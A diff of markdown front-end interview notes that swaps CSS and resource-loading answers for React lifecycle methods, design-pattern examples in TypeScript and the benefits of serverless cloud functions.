+- `static getDerivedStateFromProps()`: This method is called right before rendering the component in both the mounting and the updating phase. It's used to update the state based on changes in props over time.
+- `render()`: The render method is the only required method in a class component. It examines `this.props` and `this.state` and returns one of the following types: React elements, Arrays and fragments, Portals, String and numbers, Booleans or null.
+- `componentDidMount()`: This method is called after the component is mounted to the DOM. It's used for DOM manipulation, fetching data from a remote endpoint, and setting up subscriptions (e.g., listeners).
 
-3. **scrollHeight**: The `scrollHeight` property measures the total height of an element's content, including content not visible on the screen due to overflow. It includes padding but excludes borders, scrollbar, and margin. This is larger than the `clientHeight` if there's content that overflows outside the visible area.
+### Updating
+The updating phase occurs when a component's state or props change, leading to a re-render of the component. This phase includes several key lifecycle methods:
+- `static getDerivedStateFromProps()`: As in the mounting phase, this method is called before the render method and is used to update the state based on changes in props.
+- `shouldComponentUpdate()`: This method allows you to decide whether or not React should continue with the rendering process. By returning `true` or `false`, you can optimize component performance.
+- `render()`: The render method is called again to re-render the UI based on the new props or state.
+- `getSnapshotBeforeUpdate()`: This method is called right before the changes from the virtual DOM are to be reflected in the DOM. It can return a value that will be passed to `componentDidUpdate()`.
+- `componentDidUpdate()`: Called after the update has been rendered and reflected in the DOM. It's used for DOM updates, fetching new data, and re-setup of subscriptions if needed.
 
-### Sample Answer
-The primary differences among `offsetHeight`, `scrollHeight`, and `clientHeight` relate to what they include in their calculations. `offsetHeight` includes the border, padding, and the vertical scrollbar (if present), making it the total outer height. `clientHeight` includes the padding and the viewable content height, but not the border or scrollbar. Lastly, `scrollHeight` measures the total height of the content, including what's not visible due to overflow, plus padding. These properties are essential for dynamically managing layouts, handling scrolling behavior, or adjusting elements based on their content size.
+### Unmounting
+The unmounting phase occurs when a component is being removed from the DOM. It includes one main lifecycle method:
+- `componentWillUnmount()`: This method is called right before a component is destroyed and removed from the DOM. It's used to perform any necessary cleanup, such as invalidating timers, canceling network requests, or cleaning up any subscriptions made in `componentDidMount()`.
+# 7. System Design.md
 
-## Retina Screen and 1px Lines Implementation
+## Common Design Patterns in Front-End Development and Their Usage Scenarios
 
-When designing for Retina displays, setting elements to 1px using CSS can result in lines that appear too thick, due to some mobile phones having a Device Pixel Ratio (DPR) of 2. This means 1 CSS pixel could use 2 physical pixels, making the line appear thicker than intended. Directly setting elements to 0.5px can lead to compatibility issues across different browsers. To achieve the desired 1px line appearance on Retina screens, we can use CSS pseudo-elements combined with the `transform` property for optimization. 
+### Design Principles
+The most important principle in design patterns is the **Open/Closed Principle**, which states that a system should be open for extension but closed for modification. This means you should be able to add new functionality without changing the existing code.
 
-Here's an improved and corrected example:
+### Factory Pattern
+The Factory pattern involves using a factory function to create instances, effectively hiding the `new` keyword to encapsulate the creation process. This pattern is useful for scenarios where the creation process is complex or when there needs to be some control over how instances are created. Examples include the jQuery `$` function and React's `createElement` function.
 
-```css
-#box::before {
-  content: '';
-  position: absolute;
-  left: 0;
-  bottom: 0;
-  width: 100%;
-  height: 1px;
-  background: #d9d9d9;
-  transform: scaleY(0.5);
-  transform-origin: 0 0;
+**Example**:
+```typescript
+class Foo {}
+
+function factory() {
+    return new Foo();
 }
+
+const f = factory();
 ```
 
-This approach leverages the `::before` pseudo-element to create a line that visually represents 1px on Retina displays by scaling it down by 50% along the Y-axis. This effectively simulates a thinner line without causing browser compatibility issues.
+### Singleton Pattern
+The Singleton pattern ensures that a class has only one instance and provides a global point of access to it. This is particularly useful for cases where a single instance of a class should be used across the system, such as the store in Vuex and Redux or a globally unique dialog/modal. JavaScript makes implementing singletons straightforward because there's no need to worry about multithreading issues that might arise in languages like Java, where thread locking mechanisms might be necessary to prevent multiple instances from being created.
 
-### Handling Borders with Border-Radius
-
-When dealing with elements that have a border-radius, applying a thin border can be slightly more complex due to the way borders interact with the border-radius. In such cases, using `box-shadow` can offer a solution that allows for a fine-tuned appearance:
-
-```css
-#box {
-  box-shadow: 0 0 0 0.5px #d9d9d9;
-}
-```
-
-This method applies a `box-shadow` that mimics a border, allowing for the adjustment of its thickness to achieve the desired 0.5px visual effect on Retina displays. It's a versatile approach that maintains the element's aesthetic, including when a border-radius is applied, ensuring the visual consistency of the design across high-resolution screens.
-
-## What is the difference between `defer` and `async` attributes in `<script>` elements?
-
-The `<script>` element can be used to include JavaScript in HTML documents. When scripts are loaded and executed, they can affect how quickly a page becomes interactive. The `defer` and `async` attributes provide different ways to control this behavior.
-
-### `defer`
-The `defer` attribute tells the browser to continue parsing the HTML document while the script is being downloaded asynchronously. The key point is that the script execution is deferred until the entire HTML document has been parsed. This means that scripts with `defer` will not run until the HTML parsing is complete, which is similar to placing a `<script>` tag at the end of the `<body>` element. However, `defer` ensures that scripts are executed in the order they appear in the document, which is not guaranteed when scripts are manually placed at the bottom of the `<body>`. 
-
-### `async`
-The `async` attribute also allows the script to be downloaded in parallel to HTML parsing. However, unlike `defer`, `async` scripts are executed as soon as they are downloaded, which could be before or after the HTML parsing is complete. This means the execution order of scripts is not guaranteed. `async` is best used for scripts that do not depend on other scripts and do not modify the DOM (Document Object Model).
-
-### Difference between Prefetch and DNS-Prefetch
-
-#### Prefetch and Preload
-- **Preload** is a directive used to instruct the browser to load a resource early in the page's lifecycle, because it will be needed soon. This is crucial for resources that are critical to the current page's content, ensuring they are loaded with higher priority. The syntax is `<link rel="preload" href="example.js" as="script">` (or as="style" for CSS files), indicating that the resource is important for the immediate page load.
-- **Prefetch** is a hint to the browser that a resource might be needed in the future, but not on the current page. Resources prefetched are fetched and stored in the cache with low priority, during idle browser time, making them faster to load on subsequent page visits. The syntax is `<link rel="prefetch" href="example.js" as="script">`, suggesting the resource may be used in subsequent pages or actions.
-
-#### DNS-Prefetch and Preconnect
-- **DNS-Prefetch** is a way to resolve domain names (DNS lookups) before a user clicks on a link. This process reduces latency when the user navigates to the linked resource, as the DNS resolution step is already completed. The syntax for using it is `<link rel="dns-prefetch" href="//example.com">`. It's especially useful for third-party resources or any links that lead to different domains.
-- **Preconnect** goes a step further than DNS-prefetch by not only resolving the domain name but also performing the TCP handshake and, if the protocol is HTTPS, the TLS negotiation. This fully prepares the browser for a future connection, reducing the connection establishment time. The syntax is `<link rel="preconnect" href="//example.com">`. Preconnect is more comprehensive than DNS-prefetch because it completes all the preliminary network steps, making the resource ready to be used with minimal delay.
-
-### Summary
-- Use **preload** for critical resources needed for the current page to ensure they are loaded quickly and with high priority.
-- Use **prefetch** for resources that will be needed in subsequent page visits, to speed up their load time when the user navigates to those pages.
-- Use **dns-prefetch** to resolve domain names ahead of time, reducing DNS lookup time for third-party resources or anticipated navigations.
-- Use **preconnect** to fully prepare for a future connection, including DNS lookup, TCP handshake, and TLS negotiation, minimizing the latency for high-priority, cross-origin requests.
-
-## How to handle text Overflow with Ellipsis in CSS? 
-
-When working with web design and front-end development, managing text overflow elegantly ensures that the UI remains clean and user-friendly even when content exceeds its container's bounds. CSS provides mechanisms to handle single-line and multi-line text overflow scenarios, allowing text that doesn't fit in its container to be truncated and represented with an ellipsis (`...`). Here's how to achieve this:
-
-### Single-line Text Overflow
-
-For single-line text overflow, where you want text that exceeds the width of its container to end with an ellipsis, you can use the following CSS properties:
-
-```css
-#box1 {
-    border: 1px solid #ccc;
-    width: 100px; /* Fixed width */
-    white-space: nowrap; /* Prevents text from wrapping to a new line */
-    overflow: hidden; /* Hides text that overflows the container's bounds */
-    text-overflow: ellipsis; /* Adds an ellipsis to indicate text overflow */
-}
-```
-
-In this setup, `white-space: nowrap` ensures the text stays on a single line, `overflow: hidden` hides any overflow, and `text-overflow: ellipsis` replaces the hidden overflow text with an ellipsis.
-
-### Multi-line Text Overflow
-
-Handling text overflow for multi-line scenarios, where you want to limit the text to a specific number of lines and display an ellipsis for overflow text, involves a bit more CSS, particularly leveraging webkit-specific properties:
-
-```css
-#box2 {
-    border: 1px solid #ccc;
-    width: 100px; /* Fixed width */
-    overflow: hidden; /* Hides text that overflows the container's bounds */
-    display: -webkit-box; /* Displays the container as a webkit flex box */
-    -webkit-box-orient: vertical; /* Sets the children's orientation to vertical */
-    -webkit-line-clamp: 3; /* Limits the box to showing 3 lines of text, with overflow indicated by an ellipsis */
-}
-```
-
-This method uses `-webkit-box`, `-webkit-box-orient`, and `-webkit-line-clamp` to achieve multi-line truncation. It's important to note that this approach is somewhat limited by its compatibility with only webkit-based browsers (e.g., Safari, Chrome). However, it's widely used due to its simplicity and effectiveness in most web scenarios.
-
-## CSS Layout: Flexbox Solution for a Responsive Three-Div Setup
-
-### Scenario Description
-You have a large `div` element that contains three smaller `div` elements. The goal is to position these three child `div`s side by side — left, center, and right within the parent `div`. The left and right `div`s have a fixed width, while the center `div` should automatically adjust its width to occupy all remaining space.
-
-### Solution and Explanation
-
-To achieve this layout, you can use CSS Flexbox. Flexbox provides an efficient way to distribute space and align items within a container, even when their size is unknown or dynamic.
-
-Here is a step-by-step guide to implement the described layout:
-
-1. **Set the Display Property of the Parent `div`**: First, you need to define the parent `div` as a flex container. This is done by setting its `display` property to `flex`.
-
-    ```css
-    .parent {
-        display: flex;
+**Example**:
+```typescript
+class Singleton {
+    private static instance: Singleton;
+    private constructor() {}
+    static getInstance() {
+        if (!Singleton.instance) {
+            Singleton.instance = new Singleton();
+        }
+        return Singleton.instance;
     }
-    ```
-
-2. **Define the Width of the Child `div`s**: Next, specify the width for the left and right child `div`s since they have a fixed size. The width can be set in pixels, ems, or any other CSS units.
-
-    ```css
-    .left, .right {
-        width: 100px; /* Example fixed width */
-    }
-    ```
-
-3. **Flexible Width for the Center `div`**: For the center `div`, you want it to fill the remaining space. This is achieved by setting the `flex-grow` property to a value greater than 0. Setting it to 1 tells the `div` to occupy any available space.
-
-    ```css
-    .center {
-        flex-grow: 1;
-    }
-    ```
-
-### Complete CSS Example
-
-```css
-.parent {
-    display: flex;
+    fn1() {}
+    fn2() {}
 }
 
-.left, .right {
-    width: 100px; /* Fixed width */
-}
-
-.center {
-    flex-grow: 1; /* Occupies the remaining space */
-}
+const s = Singleton.getInstance();
+s.fn1();
 ```
 
-### HTML Structure
+### Proxy Pattern
+The Proxy pattern involves using a proxy layer that clients interact with instead of accessing the object directly. This allows for various operations, like monitoring or intercepting get and set operations, to be performed transparently. A practical example of this pattern is the implementation of Vue3's reactivity system using ES6's `Proxy`.
 
-```html
-<div class="parent">
-    <div class="left">Left</div>
-    <div class="center">Center</div>
-    <div class="right">Right</div>
-</div>
+**Example**:
+```typescript
+const obj = new Proxy({}, {
+    get(target, key) {
+        console.log('get', key);
+        return target[key];
+    },
+    set(target, key, value) {
+        console.log('set', key, value);
+        target[key] = value;
+    }
+});
+obj.name = 'jack';
+console.log(obj.name);
 ```
 
-### Key Takeaways
+### Observer Pattern
+The Observer pattern is widely used in front-end development. It involves a subject and observers, where the observers are notified and updated whenever the subject undergoes a change. A common example is attaching click event listeners to a button, where each listener acts as an observer to the button's click event.
 
-- **Flexbox** is a powerful layout tool in CSS that allows you to design complex layouts easily and responsively.
-- The `flex-grow` property on a flex item allows it to expand and fill available space in a flex container, which is perfect for adaptive layouts.
-- Setting the `display` property of a container to `flex` initiates a flex context, which then enables the use of Flexbox properties on its child elements.
+**Example**:
+```typescript
+btn.addEventListener('click', () => {
+    console.log('click');
+});
+```
+
+### Publish-Subscribe Pattern
+Similar to the Observer pattern, the Publish-Subscribe pattern provides a more decoupled way for components to communicate. Components can publish events to a specific event channel and subscribe to this channel to receive notifications. It's important to unsubscribe from events, especially in component lifecycle hooks, to prevent memory leaks.
+
+**Example**:
+```typescript
+event.on('event-key', () => {
+    console.log('event 1');
+});
+event.on('event-key', () => {
+    console.log('event 2');
+});
+event.emit('event-key');
+
+// Remember to unsubscribe
+function fn1() {}
+event.on('event-key', fn1);
+event.off('event-key', fn1);
+```
+
+### Decorator Pattern
+The Decorator pattern allows for behavior to be added to individual objects, either statically or dynamically, without affecting the behavior of other objects from the same class. This pattern is similar to Aspect-Oriented Programming (AOP) and is supported in ES and TypeScript through decorator syntax. It's particularly useful for adding features or functionalities to existing classes without modifying them.
+
+**Example**:
+```typescript
+@testable
+class MyTestableClass {
+    // ...
+}
+
+function testable(target) {
+    target.isTestable = true;
+}
+
+console.log(MyTestableClass.isTestable);
+```
+In the example above, `@testable` is a decorator that adds new functionality to `MyTestableClass`.
+
+### What's the distinction between the Observer pattern and the Publish-Subscribe pattern?
+
+### Observer Pattern
+In the Observer pattern, the subject (the object being observed) and the observers (the objects that want to be notified of changes in the subject) have direct knowledge of each other. This means there is a direct relationship where the subject holds references to the observers and directly notifies them of any changes. This pattern allows for a straightforward and direct communication line but can lead to higher coupling between the subject and its observers.
+
+#### Characteristics:
+- **Direct Communication**: Observers are directly registered with the subject.
+- **Coupling**: There is a higher degree of coupling, as the subject and observers are directly aware of each other.
+- **Use Case**: Suitable for simpler scenarios where the subject's state change is of interest to specific observers directly related to the subject.
+
+### Publish-Subscribe Pattern
+The Publish-Subscribe pattern, on the other hand, introduces a middle layer known as the "event channel" or "message broker," which decouples the publishers (the sources of events) from the subscribers (the receivers of events). Publishers publish events to the event channel without knowing who the subscribers will be. Similarly, subscribers listen for events through the event channel without knowing who the publishers are. This level of indirection adds flexibility and reduces coupling between components, making the system more scalable and easier to extend.
+
+#### Characteristics:
+- **Indirect Communication**: The communication between publishers and subscribers is mediated by an event channel, without direct knowledge of each other.
+- **Coupling**: There is lower coupling due to the presence of the event channel as an intermediary.
+- **Use Case**: Ideal for more complex scenarios where the event source and event consumers need to remain decoupled for scalability and maintainability reasons.
+
+In summary, the key difference lies in the relationship and communication method between the parties involved: the Observer pattern facilitates direct communication between the subject and its observers, resulting in tighter coupling, whereas the Publish-Subscribe pattern uses an event channel to mediate communication, leading to looser coupling and greater flexibility.
+
+## Benefits of Using Cloud Functions like Google Cloud Compared to Traditional Front-end/Back-end Separation
+
+Cloud functions, such as those provided by Google Cloud, offer several advantages over the traditional front-end/back-end separation architecture. These benefits stem from cloud functions' ability to operate in a serverless environment, which changes how applications are built, deployed, and scaled. Below, we detail these benefits:
+
+### Cost Efficiency
+- **Google Cloud Functions** operate on a pay-as-you-go model, where charges are incurred only when the code is executed. This is particularly beneficial for applications with fluctuating traffic, as it aligns operational costs directly with actual usage, avoiding the need to pay for idle resources.
+
+### Simplified Management
+- **Serverless Architecture**: With Google Cloud Functions, there's no need to manage servers. Google handles all the infrastructure management tasks, including maintenance, patching, and security. In contrast, traditional architectures, even when utilizing virtual or cloud servers, require developers or operations teams to manage server configuration and upkeep.
+
+### Automatic Scaling
+- **Adaptability to Traffic**: Google Cloud Functions automatically scale based on the number of requests. This ensures that during peak traffic periods, more resources are allocated to handle increased concurrent requests, and during low traffic times, resources are reduced to save costs. Traditional models often require manual intervention or additional automation tools for scaling.
+
+### Rapid Iteration
+- **Development Agility**: The serverless model enables developers to quickly create and deploy code without worrying about underlying infrastructure. This supports faster development cycles and rapid iteration, whereas traditional deployment models might involve complex configuration and deployment processes.
+
+### Integration and Automation
+- **Seamless Ecosystem Connectivity**: Google Cloud Functions can be easily integrated with other services and tools within the Google Cloud Platform (GCP), such as Google Cloud Pub/Sub and Google Cloud Storage. This facilitates the creation of end-to-end automated solutions, streamlining the development process and enhancing functionality.
+
+### Event-Driven Architecture
+- **Responsive Microservices**: Google Cloud Functions inherently support an event-driven architecture, directly responding to events from Google Cloud services, like file uploads to Google Cloud Storage or messages published to Google Cloud Pub/Sub. This model is ideal for building highly decoupled and responsive microservices, as it allows services to react immediately to changes and triggers within the ecosystem.
